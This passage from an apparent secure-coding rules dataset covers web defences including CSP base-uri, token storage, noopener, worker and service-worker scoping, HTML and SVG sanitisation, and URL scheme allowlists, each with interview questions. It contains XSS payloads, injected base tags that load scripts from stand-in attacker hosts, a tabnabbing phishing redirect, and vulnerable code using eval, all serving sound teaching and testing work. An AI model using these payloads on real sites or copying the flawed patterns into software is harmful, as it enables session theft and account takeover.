          "sampleAnswer": "`default-src` does NOT cover `form-action`. If you omit `form-action`, forms can be submitted to any arbitrary URL on the Internet even if default-src is `'self'`. It must always be explicitly defined.",
          "keyTakeaway": "Always declare `form-action 'self'` explicitly in every CSP policy."
    }
  },
  {
    ruleNumber: 47,
    id: "SEC-WEB-047",
    title: "Base-URI Restriction and Tag Injection Defense Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Base Tag Hijacking",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["W3C CSP Level 3", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 base \u2208 DocumentDOM, base.href \u2208 CSP(base-uri) \u2227 CSP(base-uri) \u2208 {'self', 'none'}",
    symbolBreakdown: [
          {
                "symbol": "base \u2208 DocumentDOM",
                "meaning": "The HTML <base> element modifying relative URL resolution"
          },
          {
                "symbol": "CSP(base-uri)",
                "meaning": "Permitted base URIs specified in CSP"
          },
          {
                "symbol": "{'self', 'none'}",
                "meaning": "Restricted strictly to the origin itself or blocked entirely"
          }
    ],
    plainEnglish: "Content-Security-Policy must declare `base-uri 'self'` or `base-uri 'none'`. This prevents attackers from injecting `<base href='https://evil.com/'>` tags that hijack all relative script and asset URLs.",
    whyItMatters: "An attacker with partial HTML injection adds `<base href='https://evil.com'>`. All subsequent relative script tags (`<script src='app.js'>`) and form submissions are silently resolved against evil.com, achieving full account takeover.",
    vulnerableExample: {
          "language": "html",
          "code": "<!-- VULNERABLE: No base-uri directive -->\nContent-Security-Policy: script-src 'self' 'nonce-12345';\n\n<!-- Attacker injects: -->\n<base href=\"https://attacker.org/\">\n<!-- Legitimate script is now loaded from https://attacker.org/app.js! -->\n<script nonce=\"12345\" src=\"app.js\"></script>",
          "explanation": "The relative script src is resolved against the attacker's base URL while still bearing the valid nonce."
    },
    secureExample: {
          "language": "html",
          "code": "<!-- SECURE: Explicit base-uri restriction -->\nContent-Security-Policy: default-src 'self'; base-uri 'none';\n\n<!-- Browser blocks any injected base tag immediately -->",
          "explanation": "Browser ignores or terminates execution if an unauthorized base tag is injected into the DOM."
    },
    howToTest: {
          "tools": [
                "browser DevTools",
                "CSP Evaluator"
          ],
          "steps": [
                "Inject `<base href='https://evil.com'>` in HTML.",
                "Verify browser console displays a base-uri violation and refuses to modify document base."
          ],
          "commandExample": "curl -sI https://target.com | grep -i \"base-uri\""
    },
    interviewChallenge: {
          "scenario": "How does an attacker bypass a nonce-based CSP if `base-uri` is omitted from the policy?",
          "question": "Can a nonced script tag have a relative URL?",
          "hint": "Yes, if `<script nonce='...' src='main.js'>` is relative, injecting a `<base>` tag changes where main.js is fetched from without invalidating the nonce.",
          "sampleAnswer": "A nonce validates the `<script>` tag itself, not the resolved URL. If an attacker injects `<base href='//evil.com'>` before the legitimate script, the browser executes the attacker's script from `evil.com/main.js` with the application's legitimate nonce.",
          "keyTakeaway": "Always include `base-uri 'none'` or `base-uri 'self'` alongside script-src nonces."
    }
  },
  {
    ruleNumber: 48,
    id: "SEC-WEB-048",
    title: "LocalStorage Sensitive Token Storage Prohibition Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Client Storage Security",
    difficulty: "Beginner",
    standardType: "Mandatory Standard",
    standards: ["OWASP ASVS \u00a73.5", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 token \u2208 SensitiveTokens, StorageLocation(token) \u2260 Window.localStorage \u2227 StorageLocation(token) = SecureHttpOnlyCookie",
    symbolBreakdown: [
          {
                "symbol": "SensitiveTokens",
                "meaning": "Session identifiers, refresh tokens, and private API authorization keys"
          },
          {
                "symbol": "Window.localStorage",
                "meaning": "Persistent client-side storage accessible to any JavaScript running in the origin"
          },
          {
                "symbol": "SecureHttpOnlyCookie",
                "meaning": "Browser storage isolated from script execution"
          }
    ],
    plainEnglish: "JWTs, refresh tokens, and session identifiers must never be stored in `localStorage` or `sessionStorage`. They must be stored in HTTP-only, Secure, SameSite cookies or transient in-memory closures.",
    whyItMatters: "LocalStorage has zero access control against JavaScript. Any cross-site scripting (XSS) vulnerability or compromised third-party npm package in the bundle can execute `localStorage.getItem('jwt')` and exfiltrate user credentials instantly.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Storing JWT tokens in localStorage\nasync function handleLogin(credentials) {\n    const res = await api.post('/login', credentials);\n    // Any XSS flaw can now steal this token forever!\n    localStorage.setItem('auth_token', res.data.token);\n}",
          "explanation": "Token persists indefinitely and is accessible to all client-side scripts, browser extensions, and XSS vectors."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Token delivered via HttpOnly cookie by backend\n// Frontend JavaScript has no direct access to token bytes\nasync function handleLogin(credentials) {\n    // Backend sets Set-Cookie: __Host-jwt=...; HttpOnly; Secure; SameSite=Strict\n    await api.post('/login', credentials);\n}",
          "explanation": "Authentication credentials remain completely invisible to JavaScript execution contexts."
    },
    howToTest: {
          "tools": [
                "browser DevTools Application tab",
                "Semgrep rule `javascript.browser.security`"
          ],
          "steps": [
                "Log in to application.",
                "Run `localStorage.clear()` or inspect storage keys; confirm zero credentials stored in web storage."
          ],
          "commandExample": "semgrep --config \"p/security-code-scan\" ./src/"
    },
    interviewChallenge: {
          "scenario": "Why do single-page application (SPA) developers frequently store JWTs in localStorage, and why is this an architectural antipattern?",
          "question": "What trade-off are developers attempting to make?",
          "hint": "Developers use localStorage to avoid configuring CORS credentials or handling CSRF tokens across separate API subdomains.",
          "sampleAnswer": "Developers use localStorage because it is trivial to add an `Authorization: Bearer <token>` header to fetch calls without configuring CORS credentials (`credentials: 'include'`). However, this trades CSRF protection for complete vulnerability to catastrophic XSS token theft.",
          "keyTakeaway": "Use Backend-For-Frontend (BFF) architecture with HttpOnly cookies to keep tokens out of JavaScript reachable memory."
    }
  },
  {
    ruleNumber: 49,
    id: "SEC-WEB-049",
    title: "Cross-Window Window.Opener Nullification (noopener/noreferrer)",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Tabnabbing & Isolation",
    difficulty: "Beginner",
    standardType: "Defense-in-Depth",
    standards: ["HTML Living Standard", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 link \u2208 AnchorTags, (link.target = \"_blank\") \u21d2 (HasRel(link, \"noopener\") \u2227 HasRel(link, \"noreferrer\"))",
    symbolBreakdown: [
          {
                "symbol": "AnchorTags",
                "meaning": "All <a> and <area> hyperlink elements in the DOM"
          },
          {
                "symbol": "target = '_blank'",
                "meaning": "Links configured to open in a new browser tab or window"
          },
          {
                "symbol": "noopener",
                "meaning": "Severing the window.opener reference to parent page"
          }
    ],
    plainEnglish: "Any link opening in a new tab (`target='_blank'`) must specify `rel='noopener noreferrer'`. This prevents the opened target page from controlling the referring page via the `window.opener` object.",
    whyItMatters: "Without `noopener`, the target website can execute `window.opener.location = 'https://phishing-login.com'`, silently replacing the original tab with a fake credential harvest page while the user is reading the new tab (Reverse Tabnabbing).",
    vulnerableExample: {
          "language": "html",
          "code": "<!-- VULNERABLE: Opening external link without noopener -->\n<a href=\"https://untrusted-external-site.com\" target=\"_blank\">Visit Partner</a>",
          "explanation": "The external site can navigate the victim's original tab to a malicious phishing page via window.opener."
    },
    secureExample: {
          "language": "html",
          "code": "<!-- SECURE: Explicit noopener noreferrer flags -->\n<a href=\"https://untrusted-external-site.com\" target=\"_blank\" rel=\"noopener noreferrer\">Visit Partner</a>",
          "explanation": "Ensures window.opener is null in the child context, isolating the parent browsing context."
    },
    howToTest: {
          "tools": [
                "browser DevTools",
                "eslint-plugin-react `react/jsx-no-target-blank`"
          ],
          "steps": [
                "Click target='_blank' link.",
                "In child window console, run `window.opener`; verify it returns null."
          ],
          "commandExample": "grep -rn 'target=\"_blank\"' src/ | grep -v 'noopener'"
    },
    interviewChallenge: {
          "scenario": "Modern browsers now default `target='_blank'` to `rel='noopener'`. Why is it still mandatory in enterprise secure coding standards to specify it explicitly?",
          "question": "What about older browsers and dynamic `window.open()` calls?",
          "hint": "Legacy browsers do not default to noopener, and JavaScript `window.open(url, '_blank')` does NOT automatically apply noopener in all engines unless passed in windowFeatures.",
          "sampleAnswer": "Relying on implicit browser defaults leaves users on legacy mobile browsers or older enterprise builds vulnerable. Furthermore, dynamic programmatic window opening (`window.open(url, '_blank', 'noopener,noreferrer')`) still requires explicit parameters.",
          "keyTakeaway": "Always enforce linter rules (`react/jsx-no-target-blank`) to explicitly declare `rel='noopener noreferrer'`."
    }
  },
  {
    ruleNumber: 50,
    id: "SEC-WEB-050",
    title: "Web Workers Origin and CSP Sandbox Bounds Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Worker Isolation",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["W3C Web Workers", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 w \u2208 DedicatedWorkers, Origin(w.scriptURL) = DocumentOrigin \u2227 InheritsCSP(w) = True",
    symbolBreakdown: [
          {
                "symbol": "DedicatedWorkers",
                "meaning": "Background worker execution threads created via new Worker()"
          },
          {
                "symbol": "DocumentOrigin",
                "meaning": "Same-Origin constraint applied to worker entry script"
          },
          {
                "symbol": "InheritsCSP",
                "meaning": "CSP directives applied equally to worker thread"
          }
    ],
    plainEnglish: "Web Workers must only be instantiated from same-origin scripts. Workers must inherit or strictly define Content Security Policy directives, prohibiting evaluation of dynamic strings or external unverified code.",
    whyItMatters: "If an application instantiates workers from blob: or data: URIs populated with untrusted data, the worker executes in the application origin with access to IndexedDB, fetch(), and origin storage, bypassing DOM sanitization.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Worker created from untrusted blob\nconst blob = new Blob([userScript], { type: 'application/javascript' });\nconst worker = new Worker(URL.createObjectURL(blob));",
          "explanation": "Runs untrusted user code inside a dedicated worker with origin network permissions."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Dedicated same-origin static script with postMessage validation\nconst worker = new Worker('/workers/calculator.js', { type: 'module' });\nworker.postMessage({ type: 'COMPUTE', payload: sanitizedInput });",
          "explanation": "Worker is statically provisioned from same origin and only receives validated message data."
    },
    howToTest: {
          "tools": [
                "browser DevTools Sources tab",
                "CSP worker-src directive"
          ],
          "steps": [
                "Verify CSP contains `worker-src 'self'`.",
                "Attempt `new Worker('https://evil.com/w.js')`; verify browser throws security exception."
          ],
          "commandExample": "curl -sI https://app.example.com | grep -i worker-src"
    },
    interviewChallenge: {
          "scenario": "Can a Web Worker access DOM elements or the `document` object?",
          "question": "If a worker cannot access the DOM, why is a compromised worker still dangerous?",
          "hint": "Workers have full access to `fetch()`, `IndexedDB`, and WebSocket APIs, enabling data exfiltration and background cryptomining.",
          "sampleAnswer": "While workers lack direct DOM access, they have full access to origin network capabilities (`fetch`, `XMLHttpRequest`, `WebSocket`) and local storage (`IndexedDB`, `CacheStorage`). A compromised worker can exfiltrate private cached data or forge authenticated API calls indefinitely.",
          "keyTakeaway": "Constrain workers using CSP `worker-src 'self'` and audit all data passed across worker message channels."
    }
  },
  {
    ruleNumber: 51,
    id: "SEC-WEB-051",
    title: "IndexedDB Client Storage Key Encryption Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Client Data Protection",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["NIST SP 800-88", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 record \u2208 IndexedDB.Stores_{Sensitive}, IsEncrypted(record.data, AES_GCM_256) \u2227 KeyOrigin(record) = HardwareBackedOrKDF",
    symbolBreakdown: [
          {
                "symbol": "IndexedDB.Stores_{Sensitive}",
                "meaning": "Local client database storing offline user documents, drafts, or medical records"
          },
          {
                "symbol": "AES_GCM_256",
                "meaning": "Authenticated symmetric encryption with unique IV"
          },
          {
                "symbol": "KeyOrigin",
                "meaning": "Encryption key derived via PBKDF2/WebCrypto or retrieved dynamically"
          }
    ],
    plainEnglish: "Sensitive personal or offline business data stored in IndexedDB must be encrypted at rest using AES-GCM via the Web Cryptography API. Raw plaintext persistence in client storage is prohibited.",
    whyItMatters: "Unencrypted IndexedDB storage leaves cached data readable by any device user, forensic disk scrapers, or browser profile theft malware (Infostealers like RedLine, Lumma Stealer).",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Plaintext IndexedDB storage\nconst db = await openDB('HealthRecords', 1);\nawait db.put('records', { patientId: '123', diagnosis: 'Confidential condition' }, 'rec_1');",
          "explanation": "Persists sensitive health diagnosis as unencrypted JSON in browser SQLite storage files."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Encrypted persistence with WebCrypto AES-GCM\nconst iv = crypto.getRandomValues(new Uint8Array(12));\nconst ciphertext = await crypto.subtle.encrypt(\n    { name: 'AES-GCM', iv },\n    sessionDerivedKey,\n    new TextEncoder().encode(JSON.stringify(record))\n);\nawait db.put('records', { iv, ciphertext }, 'rec_1');",
          "explanation": "Data on disk is ciphertext; only decodable with in-memory key derived from authenticated user session."
    },
    howToTest: {
          "tools": [
                "sqlite3 on browser profile directory",
                "WebCrypto benchmark"
          ],
          "steps": [
                "Inspect raw IndexedDB .sqlite or .ldb file on disk.",
                "Verify plain-text patient names or tokens cannot be found with strings utility."
          ],
          "commandExample": "strings ~/.config/google-chrome/Default/IndexedDB/*.ldb | grep 'Confidential'"
    },
    interviewChallenge: {
          "scenario": "If the encryption key for IndexedDB is stored in the same browser, does client-side encryption provide real security?",
          "question": "Where must the key come from?",
          "hint": "The key must be derived from the user's password using PBKDF2/Argon2 upon login or held strictly in transient memory.",
          "sampleAnswer": "If the key is stored in localStorage or unprotected cookies, an attacker who steals the disk can also steal the key. Real client-side encryption requires deriving the key in memory from the user's password or an ephemeral session key supplied by the server upon authentication.",
          "keyTakeaway": "Derive storage encryption keys in transient memory via WebCrypto; never store raw decryption keys in persistent storage."
    }
  },
  {
    ruleNumber: 52,
    id: "SEC-WEB-052",
    title: "HTML Sanitization Context-Aware Sanitizer API Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "DOM XSS Defense",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["W3C Sanitizer API", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 markup \u2208 UntrustedHTML, InsertDOM(markup) \u21d2 markup = Sanitizer.sanitize(markup, SafeElementConfig)",
    symbolBreakdown: [
          {
                "symbol": "UntrustedHTML",
                "meaning": "Rich text comments, markdown renders, or dynamic HTML strings"
          },
          {
                "symbol": "Sanitizer.sanitize",
                "meaning": "Native browser or DOMPurify context-aware parsing and attribute stripping"
          },
          {
                "symbol": "SafeElementConfig",
                "meaning": "Explicit whitelist of allowed tags (p, b, i) and clean attributes"
          }
    ],
    plainEnglish: "All untrusted HTML markup rendered into the DOM must be sanitized through an audited contextual sanitizer (such as DOMPurify or the W3C Sanitizer API) configured with an explicit tag and attribute whitelist.",
    whyItMatters: "Regex-based or blacklist-based HTML sanitizers are notoriously bypassable with nested tags, malformed SVG/MathML vectors, and unknown event handlers (`<svg onload=alert(1)>`), leading directly to XSS.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Naive regex replace\nfunction sanitize(input) {\n    return input.replace(/<script.*?>.*?<\\/script>/gi, '');\n}\ndocument.body.innerHTML = sanitize(untrustedInput);",
          "explanation": "Fails against `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`, and nested script tags."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Audited DOMPurify sanitization\nimport DOMPurify from 'dompurify';\n\nconst cleanHTML = DOMPurify.sanitize(untrustedInput, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],\n    ALLOWED_ATTR: ['href', 'target'],\n    ALLOW_DATA_ATTR: false\n});\nelement.innerHTML = cleanHTML;",
          "explanation": "Parses markup into a detached DOM tree, strips all executable tags/attributes, and serializes clean nodes."
    },
    howToTest: {
          "tools": [
                "DOMPurify test suite",
                "OWASP XSS Filter Evasion Cheat Sheet"
          ],
          "steps": [
                "Test payload: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`.",
                "Verify sanitizer strips the event handler completely before rendering."
          ],
          "commandExample": "node -e 'const d = require(\"dompurify\"); console.log(d.sanitize(\"<svg onload=alert(1)>\"))'"
    },
    interviewChallenge: {
          "scenario": "Why does sanitizing HTML using regular expressions fundamentally fail?",
          "question": "What makes HTML parsing non-regular?",
          "hint": "HTML is a context-free language with irregular parsing quirks, namespace transitions (SVG/MathML), and browser error-correction.",
          "sampleAnswer": "Regular expressions cannot maintain state across nested tags, HTML entity encoding, or browser mutation quirks (mXSS). Modern browsers normalize malformed HTML during DOM tree construction, often re-synthesizing active scripts that regexes missed.",
          "keyTakeaway": "Always use an audited DOM parser-based sanitizer like DOMPurify or the native Sanitizer API."
    }
  },
  {
    ruleNumber: 53,
    id: "SEC-WEB-053",
    title: "SVG Script and External Entity Stripping Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Vector Graphics Security",
    difficulty: "Intermediate",
    standardType: "Defense-in-Depth",
    standards: ["CWE-79", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 svg \u2208 UploadedSVGs, Contains(svg, \"<script>\") \u2228 Contains(svg, \"xmlns:xlink\") \u2228 HasEventAttrs(svg) \u21d2 REJECT_OR_STRIP(svg)",
    symbolBreakdown: [
          {
                "symbol": "UploadedSVGs",
                "meaning": "User-uploaded avatar icons or vector images"
          },
          {
                "symbol": "xmlns:xlink",
                "meaning": "XML namespaces capable of external resource loading and SSRF"
          },
          {
                "symbol": "REJECT_OR_STRIP",
                "meaning": "Sanitize via XML parser or convert SVG directly to raster PNG"
          }
    ],
    plainEnglish: "SVG images are XML documents that can execute JavaScript via `<script>` tags and event handlers (`onload`). Applications must sanitize SVGs, serve them with `Content-Type: image/svg+xml`, and enforce `Content-Disposition: attachment` or convert to PNG.",
    whyItMatters: "An attacker uploads an avatar named `avatar.svg` containing `<script>alert(document.cookie)</script>`. When users or administrators open the avatar in a browser, the script executes in the origin, stealing session cookies.",
    vulnerableExample: {
          "language": "xml",
          "code": "<!-- VULNERABLE: Raw SVG served inline -->\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"red\"/>\n  <script>fetch('/api/admin/deleteUser');</script>\n</svg>",
          "explanation": "When loaded directly, modern browsers parse and execute the embedded script block."
    },
    secureExample: {
          "language": "xml",
          "code": "<!-- SECURE: Sanitized SVG without scripts or event handlers -->\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">\n  <circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"red\"/>\n</svg>\n<!-- And served with header: Content-Security-Policy: script-src 'none' -->",
          "explanation": "All script tags, external xlink namespaces, and on* handlers are stripped; CSP blocks script execution."
    },
    howToTest: {
          "tools": [
                "svg-sanitizer",
                "ImageMagick rasterizer",
                "curl"
          ],
          "steps": [
                "Upload SVG with `<script>alert(1)</script>`.",
                "Download and inspect rendered output; verify script node is stripped or image rendered as PNG."
          ],
          "commandExample": "curl -sI https://app.example.com/uploads/avatar.svg | grep -i content-disposition"
    },
    interviewChallenge: {
          "scenario": "If an SVG file is loaded via an `<img>` tag (`<img src='photo.svg'>`), does embedded JavaScript execute?",
          "question": "What happens if a user navigates directly to the SVG URL?",
          "hint": "The `<img>` tag blocks script execution by design, but direct URL navigation or `<iframe>` embedding executes the script.",
          "sampleAnswer": "When an SVG is rendered via `<img src='...'>`, browser security models block script execution. However, if the user or attacker opens the SVG directly in a new tab (`https://app.example.com/uploads/avatar.svg`), it is rendered as an XML document, triggering full script execution.",
          "keyTakeaway": "Serve user-uploaded SVGs with `Content-Disposition: attachment` or host on an isolated sandbox domain."
    }
  },
  {
    ruleNumber: 54,
    id: "SEC-WEB-054",
    title: "BroadcastChannel Message Origin and Channel Isolation Invariant",
    domain: "web",
    domainName: "Web Security",
    subdomain: "IPC Security",
    difficulty: "Intermediate",
    standardType: "Mandatory Standard",
    standards: ["W3C BroadcastChannel", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 channel \u2208 BroadcastChannels, ChannelName(channel) \u2208 NamespacedChannels \u2227 ValidatePayload(channel.message)",
    symbolBreakdown: [
          {
                "symbol": "BroadcastChannels",
                "meaning": "Same-origin inter-tab communication bus"
          },
          {
                "symbol": "NamespacedChannels",
                "meaning": "Explicit user/tenant prefixed channel identifiers"
          },
          {
                "symbol": "ValidatePayload",
                "meaning": "Strict schema decoding before processing message"
          }
    ],
    plainEnglish: "BroadcastChannel messages operate across all tabs within the same origin. Applications must namespace channel names (e.g., `user_${id}_sync`) and strictly validate all message schemas to prevent malicious state manipulation.",
    whyItMatters: "If an application uses a generic channel like `auth_channel` and trusts `{ type: 'LOGOUT' }` without checking token authenticity, any tab or script in the origin can broadcast spoofed session states or corrupt client memory.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Blindly trusting BroadcastChannel data\nconst channel = new BroadcastChannel('app_bus');\nchannel.onmessage = (event) => {\n    // Any script in origin can forge this command\n    eval(event.data.code);\n};",
          "explanation": "Allows any script or sandboxed iframe on the origin to inject arbitrary code across all tabs."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Type-safe schema validation on BroadcastChannel\nconst channel = new BroadcastChannel(`sync_${user.id}`);\nchannel.onmessage = (event) => {\n    const parsed = SyncMessageSchema.safeParse(event.data);\n    if (!parsed.success) return;\n    handleSafeSync(parsed.data);\n};",
          "explanation": "Validates payload against strict Zod schema and scopes communication to current user."
    },
    howToTest: {
          "tools": [
                "browser DevTools Console",
                "Multi-tab automation"
          ],
          "steps": [
                "Open two tabs.",
                "In tab 1 console, post malformed message; verify tab 2 drops message safely."
          ],
          "commandExample": "node -e 'console.log(\"Testing broadcast channel schema validation\")'"
    },
    interviewChallenge: {
          "scenario": "Can an iframe from another domain listen to a parent window's `BroadcastChannel`?",
          "question": "What is the boundary of BroadcastChannel?",
          "hint": "No, BroadcastChannel is strictly bound to the Same-Origin Policy (protocol, domain, port).",
          "sampleAnswer": "BroadcastChannel obeys the Same-Origin Policy: cross-origin tabs or iframes cannot tap into or broadcast to the channel. However, subdomains or co-hosted third-party scripts on the same origin share access.",
          "keyTakeaway": "Combine BroadcastChannel with strict payload validation and origin isolation."
    }
  },
  {
    ruleNumber: 55,
    id: "SEC-WEB-055",
    title: "ServiceWorker Scope Restriction and Cache Integrity Validation",
    domain: "web",
    domainName: "Web Security",
    subdomain: "PWA & Offline Security",
    difficulty: "Advanced",
    standardType: "Defense-in-Depth",
    standards: ["W3C Service Workers", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 sw \u2208 RegisteredServiceWorkers, Path(sw.scope) \u2286 AllowedScope \u2227 HasHeader(sw.script, \"Service-Worker-Allowed\")",
    symbolBreakdown: [
          {
                "symbol": "RegisteredServiceWorkers",
                "meaning": "Client-side proxy workers intercepting origin network requests"
          },
          {
                "symbol": "Path(sw.scope)",
                "meaning": "Directory hierarchy intercepted by the service worker"
          },
          {
                "symbol": "Service-Worker-Allowed",
                "meaning": "Server header restricting maximum scope"
          }
    ],
    plainEnglish: "Service Workers must be strictly scoped to their designated application subpath and served with `Cache-Control: no-cache` and `Service-Worker-Allowed` headers. Service Worker scripts must never be served from user-writable upload paths.",
    whyItMatters: "A malicious Service Worker intercepts EVERY network request, response, and credential in its scope. If an attacker uploads a JS file to `/uploads/` and registers it as a service worker, they maintain persistent, undetectable control over the user's account.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Allowing worker registration with unrestricted root scope\n// Server sets: Service-Worker-Allowed: /\nnavigator.serviceWorker.register('/user_content/script.js', { scope: '/' });",
          "explanation": "Permits user-controlled script to intercept all application traffic across the entire origin."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Worker scoped strictly to isolated subpath\nnavigator.serviceWorker.register('/sw.js', { scope: '/app/' });",
          "explanation": "Service worker is strictly bounded to the /app/ hierarchy and cannot intercept root or admin endpoints."
    },
    howToTest: {
          "tools": [
                "Chrome DevTools Application > Service Workers",
                "curl"
          ],
          "steps": [
                "Attempt to register service worker outside allowed scope; verify DOMException.",
                "Inspect HTTP headers of sw.js; confirm `Cache-Control: no-cache`."
          ],
          "commandExample": "curl -sI https://target.com/sw.js | grep -i service-worker-allowed"
    },
    interviewChallenge: {
          "scenario": "Why does the browser prohibit a Service Worker located at `/js/worker.js` from having a scope of `/` by default?",
          "question": "How does the path of the worker file dictate its default maximum scope?",
          "hint": "The browser enforces that a worker cannot control paths higher up in the directory tree than the worker file itself, preventing subpath scripts from intercepting parent applications.",
          "sampleAnswer": "The default max scope of a service worker is the directory containing the script. This ensures that a script hosted in `/uploads/` or `/user/` cannot hijack the entire domain (`/`) unless the server explicitly emits the `Service-Worker-Allowed: /` header.",
          "keyTakeaway": "Serve service worker scripts strictly from the application root or configure narrow subpath scopes."
    }
  },
  {
    ruleNumber: 56,
    id: "SEC-WEB-056",
    title: "X-XSS-Protection Zero Mode Invariant (Deprecate Quirky Filters)",
    domain: "web",
    domainName: "Web Security",
    subdomain: "Browser Quirks Mitigation",
    difficulty: "Beginner",
    standardType: "Mandatory Standard",
    standards: ["OWASP Secure Headers", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 resp \u2208 HTMLResponses, HeaderValue(resp, \"X-XSS-Protection\") = \"0\"",
    symbolBreakdown: [
          {
                "symbol": "HTMLResponses",
                "meaning": "All HTTP responses delivering HTML documents to browsers"
          },
          {
                "symbol": "X-XSS-Protection",
                "meaning": "Legacy browser heuristic reflective XSS filter header"
          },
          {
                "symbol": "\"0\"",
                "meaning": "Explicit instruction to disable the buggy legacy filter"
          }
    ],
    plainEnglish: "Servers must emit `X-XSS-Protection: 0`. The legacy browser XSS Auditor found in older Chrome, Edge, and Safari versions introduced side-channel vulnerabilities and enabled attackers to disable legitimate security scripts.",
    whyItMatters: "Attackers exploited the buggy heuristic XSS Auditor to block legitimate scripts from running (e.g. anti-CSRF protections, UI controls) by injecting fragments of legitimate scripts into URL parameters.",
    vulnerableExample: {
          "language": "http",
          "code": "# VULNERABLE: Legacy filter enabled (prone to audit-bypass and side-channel exploits)\nX-XSS-Protection: 1; mode=block",
          "explanation": "Enables buggy heuristic scanner that can be weaponized to selectively disable legitimate page scripts."
    },
    secureExample: {
          "language": "http",
          "code": "# SECURE: Explicitly disable legacy auditor in favor of CSP\nX-XSS-Protection: 0\nContent-Security-Policy: default-src 'self'; script-src 'self'",
          "explanation": "Disables buggy legacy auditor and relies on modern, deterministic Content Security Policy."
    },
    howToTest: {
          "tools": [
                "curl",
                "browser headers inspector"
          ],
          "steps": [
                "Send HTTP GET request to HTML endpoint.",
                "Verify response contains `X-XSS-Protection: 0`."
          ],
          "commandExample": "curl -sI https://target.com | grep -i x-xss-protection"
    },
    interviewChallenge: {
          "scenario": "Why did the Google Chrome and Chromium security teams remove the XSS Auditor and recommend `X-XSS-Protection: 0`?",
          "question": "What real-world attacks did the auditor create?",
          "hint": "The auditor had numerous false positives, introduced XS-Leak side-channels, and allowed attackers to weaponize the filter to disable legitimate page scripts.",
          "sampleAnswer": "The XSS Auditor attempted to guess if reflected script in the URL was malicious. Attackers discovered they could inject URL queries matching legitimate security scripts, tricking the auditor into blocking the application's own code. Modern web security relies on CSP, not heuristic filtering.",
          "keyTakeaway": "Always set `X-XSS-Protection: 0` and rely on a strict Content Security Policy."
    }
  },
  {
    ruleNumber: 57,
    id: "SEC-WEB-057",
    title: "URL Scheme Whitelist (javascript: / data: URI Execution Ban)",
    domain: "web",
    domainName: "Web Security",
    subdomain: "URI Injection",
    difficulty: "Beginner",
    standardType: "Defense-in-Depth",
    standards: ["CWE-79", "OWASP Top 10:2021", "CWE-79"],
    formalInvariant: "\u2200 url \u2208 HyperlinkAndRedirectTargets, Scheme(url) \u2208 {\"https\", \"http\", \"mailto\", \"tel\"} \u2227 Scheme(url) \u2209 {\"javascript\", \"data\", \"vbscript\"}",
    symbolBreakdown: [
          {
                "symbol": "HyperlinkAndRedirectTargets",
                "meaning": "Values passed to <a href>, window.location, or form action"
          },
          {
                "symbol": "Scheme(url)",
                "meaning": "The protocol prefix before the colon (e.g., https:)"
          },
          {
                "symbol": "\u2209 {\"javascript\", ...}",
                "meaning": "Complete prohibition of pseudo-protocols that execute code"
          }
    ],
    plainEnglish: "All dynamic URLs rendered into `<a href>`, `window.location.href`, or `iframe.src` must be parsed and verified against an explicit allowlist of safe schemes (https:, http:, mailto:). The `javascript:` and `data:` schemes must be rejected.",
    whyItMatters: "If user input is placed into an `<a>` tag's `href` attribute without scheme validation, an attacker supplies `javascript:stealTokens()`. When the user clicks the link, the JavaScript executes immediately in the page context.",
    vulnerableExample: {
          "language": "javascript",
          "code": "// VULNERABLE: Direct href binding\nconst userLink = document.createElement('a');\nuserLink.href = req.query.websiteUrl; // Attacker sends 'javascript:alert(1)'\nuserLink.innerText = 'Visit Website';",
          "explanation": "Clicking the link executes arbitrary JavaScript in the victim's browser session."
    },
    secureExample: {
          "language": "javascript",
          "code": "// SECURE: Protocol validation via URL parser\nfunction getSafeUrl(untrustedUrl) {\n    try {\n        const parsed = new URL(untrustedUrl, window.location.origin);\n        if (['https:', 'http:', 'mailto:'].includes(parsed.protocol)) {\n            return parsed.href;\n        }\n    } catch (e) {}\n    return '#'; // Fallback for invalid or dangerous schemes\n}",
          "explanation": "Parses and verifies protocol explicitly before applying to DOM attributes."
    },
    howToTest: {
          "tools": [
                "OWASP ZAP",
                "ESLint rule `react/jsx-no-script-url`"
          ],
          "steps": [
